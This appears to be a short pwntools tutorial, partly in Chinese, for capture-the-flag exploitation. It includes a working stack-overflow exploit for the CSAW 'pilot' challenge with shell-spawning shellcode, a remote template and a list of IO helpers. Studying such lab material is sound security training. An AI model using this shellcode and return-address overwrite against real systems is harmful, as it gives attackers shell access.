#
```
Pwntools Tutorials
https://github.com/Gallopsled/pwntools-tutorial#readme
```
# 程式架構
```
# 載入pwntools套件
   from pwn import *
# 建立目標物件
# 產生payload
# 送出payload給目標物件
# 保持與目標物件的互動Shell
```
## 本地端執行
```
from pwn import *

# 建立目標物件
target = process('./pilot')


# 產生payload
print target.recvuntil("[*]Location:")

leak = target.recvline()

inputAdr = int(leak.strip("\n"), 16)


payload = ""
# This shellcode is originally from: https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/
# However it looks like that site is down now
# This shellcode will pop a shell when we run it
payload += "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05" 

# Padding to the return address
payload += "0"*(0x28 - len(payload))

# Overwrite the return address with the address of the start of our input
payload += p64(inputAdr)

# 送出payload給目標物件
# Send the payload, drop to an interactive shell to use the shell we pop
target.send(payload)

# 保持與目標物件的互動Shell
target.interactive()
```
##  連練到遠端CTF執行PWN
```
#!/usr/bin/env python3
from pwn import *

# 
# r = remote(‘題目的IP',題目的PORT)  <==

+++++++++++++++
+++++++++++++++


r.interactive()
```
# 基本IO功能
```
接收資料
recv(n) -接收任意數量的可用字節
recvline() -接收資料，直到遇到換行符
recvuntil(delim) -接收資料，直到找到定界符
recvregex(pattern) -接收資料，直到滿足正則表達式模式
recvrepeat(timeout) -繼續接收資料，直到發生超時
clean() -丟棄所有緩衝的資料

傳送資料
send(data) -發送資料
sendline(line) -發送資料和換行符

整數運算
pack(int) -發送字大小的壓縮整數
unpack() -接收和解包一個字長的整數
```

# auto pwnning
```
https://guyinatuxedo.github.io/45-automatic_exploit_generation/index.html

0.) Download Challenge
1.) Get Binary Attributes/Mitigations
2.) Run it to see what it does
3.) Load it into Ghidra
4.) Analyze code, find vulnerabilities and alternate win conditions
5.) Look at bugs and things the binary has, decide on attack to attempt
6.) Write exploit script to launch attack
7.) Test it out locally
8.) Run against remote server, get flag and submit it
9.) Fix stupid mistakes made in previous steps

```
